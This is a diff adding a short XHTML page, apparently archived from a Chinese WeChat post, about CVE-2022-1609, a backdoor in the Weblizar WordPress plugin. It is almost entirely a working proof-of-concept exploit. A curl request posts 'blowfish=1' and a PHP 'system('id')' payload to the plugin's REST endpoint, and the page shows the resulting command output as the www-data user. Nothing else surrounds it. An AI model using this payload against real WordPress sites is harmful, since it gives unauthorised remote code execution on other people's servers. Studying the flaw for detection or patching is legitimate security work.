@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>CVE-2022-1609 WordPress Weblizar后门</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>CVE-2022-1609 WordPress Weblizar后门</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651868128&amp;idx=1&amp;sn=88c7fcd68b4a17917b8827aa0fd22af1&amp;chksm=8442b307b3353a11d5e8849f85f61d3e818927366987a274fd66910eb74ff4da42e90c0343ec&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzA4MDMwMjQ3Mg==&amp;mid=2651868128&amp;idx=1&amp;sn=88c7fcd68b4a17917b8827aa0fd22af1&amp;chksm=8442b307b3353a11d5e8849f85f61d3e818927366987a274fd66910eb74ff4da42e90c0343ec&amp;scene=27#wechat_redirect</a></blockquote><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li/></ul><pre class="code-snippet__js" data-lang="shell"><code><span class="code-snippet_outer"><span class="code-snippet__meta">$</span><span> curl -s -d <span class="code-snippet__string">'blowfish=1'</span> -d <span class="code-snippet__string">"blowf=system('id');"</span> <span class="code-snippet__string">'http://localhost:8888/wp-json/am-member/license'</span></span></span></code></pre></section><p><br/></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li/></ul><pre class="code-snippet__js" data-lang="kotlin"><code><span class="code-snippet_outer">uid=<span class="code-snippet__number">33</span>(www-<span class="code-snippet__keyword">data</span>) gid=<span class="code-snippet__number">33</span>(www-<span class="code-snippet__keyword">data</span>) groups=<span class="code-snippet__number">33</span>(www-<span class="code-snippet__keyword">data</span>)</span></code></pre></section><p><img data-ratio="1" data-src="https://mmbiz.qpic.cn/mmbiz_png/shVkAyu04IGc72JfW8j4slcrKsE6qUwoT2D0GI2RZqJP4csH4XET4BTZUwcdbqqoAnBD4JDXrdiaaribrLHJs60A/640?wx_fmt=png" data-type="png" data-w="20" style="display:inline-block;width:20px;vertical-align:text-bottom;" src="../Images/ae263f45ea2e3611992cef9040d1e9e4.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/shVkAyu04IGc72JfW8j4slcrKsE6qUwoT2D0GI2RZqJP4csH4XET4BTZUwcdbqqoAnBD4JDXrdiaaribrLHJs60A/640?wx_fmt=png"/></p>
+        
+</body>
+</html>
